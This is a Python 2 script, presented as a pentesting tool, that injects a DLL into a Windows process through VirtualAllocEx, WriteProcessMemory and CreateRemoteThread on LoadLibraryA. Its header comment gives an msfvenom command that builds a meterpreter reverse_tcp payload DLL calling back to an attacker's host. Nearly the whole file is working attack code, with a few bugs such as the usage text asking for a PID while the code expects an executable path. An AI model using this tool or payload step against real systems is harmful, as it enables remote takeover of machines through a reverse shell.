
# +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# DLL Hijacking
# Author - L1Z4rd H4ck3r
# learn Pentesting Online: http://oxblood-university.com

# 1) create a simple dll using metasploit msfvenom
# msfvenom -p winodows/meterpreter/reverse_tcp LHOST=(IP) LPORT=(Any_dynamic_port) -f dll > dll_inject.dll

# 2) Run the script as:
# "C:\Python27\python.exe" Dllinjection.py <PID_to_inject> <Your_dll>
#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

import sys, os
from ctypes import *
from my_debugger_defines import *

PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)
process_information = PROCESS_INFORMATION()

kernel32 = windll.kernel32


def load(path_to_exe):
    # dwCreation determines how the process is created
    # we will set it to CREATE_NEW_CONSOLE if you want
    # to see the GUI of the process
    creation_flag = CREATE_NEW_CONSOLE  # We can decide to SUSPEND the thread and then resume it after.

    # instantiation of the structs
    startupinfo = STARTUPINFO()
    startupinfo.dwFlags = 0x1
    startupinfo.wShowWindow = 0x0
    startupinfo.cb = sizeof(startupinfo)

    if kernel32.CreateProcessA(path_to_exe, None, None, None, None, creation_flag, None, None, byref(startupinfo),
                               byref(process_information)):     # We can also suspend the thread to get our code run before run the process in question
                                                                # Just have to find the value and write the corresponding code to that.
                                                                # Be sure to tag the contents
        print "We have successfully launched a process"
        print "PID: %d" % process_information.dwProcessId
    else:
        print "[*] Error: 0x%08x." % kernel32.GetLastError

    # Obtain a valid handle for the process
    h_process = open_handle(process_information.dwProcessId)



def open_handle(pid):
    handle_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not handle_process:
        print "Could not obtain a valid Handler to the process"
        sys.exit(0)
    return handle_process


def inject_dll(dll_path):

    dll_len = len(dll_path)

    # get a handler to the process to continue with the given
    handle_process = open_handle(int(process_information.dwProcessId))
    # Allocate some space for the DLL path
    path_address = kernel32.VirtualAllocEx(handle_process, 0, dll_len, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

    # Write the Dll into the given Space
    written = c_int(0)
    kernel32.WriteProcessMemory(handle_process, path_address, dll_path, dll_len, byref(written))

    # we need to resolve address to the load library. We are going to do things manually here
    # if not we have some framework to do the designing for us "pydbg"
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

    # Now let us create the remote thread
    thread_id = c_ulong(0)
    remoteData = kernel32.CreateRemoteThread(handle_process, None, 0, h_loadlib, path_address, 0, byref(thread_id))

    if not remoteData:
        print "Failed to inject the Dll. Exiting!!!"
        sys.exit(0)

    print "[+] Injection was successful"
    print "[+] Successfully created remote thread with PID: 0x%08x" % thread_id.value


exe = sys.argv[1]
path_to_dll = sys.argv[2]

if (len(sys.argv) != 3):
    print "Usage: %s <PID> <Path To DLL>" %(sys.argv[0])
    print "Eg: %s 1111 C:\\test\dll.dll" %(sys.argv[0])
    sys.exit(0)

if not os.path.isfile(path_to_dll):
    print "[-] " + path_to_dll + " does not exit"
    sys.exit(0)

if not os.access(path_to_dll, os.R_OK):
    print "[-] " + path_to_dll + " access denied."
    sys.exit(0)

load(exe)
inject_dll(path_to_dll)
